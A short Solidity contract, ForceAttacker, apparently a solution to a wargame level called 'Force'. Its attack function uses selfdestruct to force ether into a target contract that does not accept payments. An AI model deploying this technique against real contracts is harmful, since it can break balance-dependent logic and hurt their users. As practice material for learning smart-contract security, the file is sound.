// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "./Force.sol";

contract ForceAttacker {
  address force;

  constructor(address _force) {
    force = _force;
  }

  function attack() external payable{
    selfdestruct(payable(force));
  }
}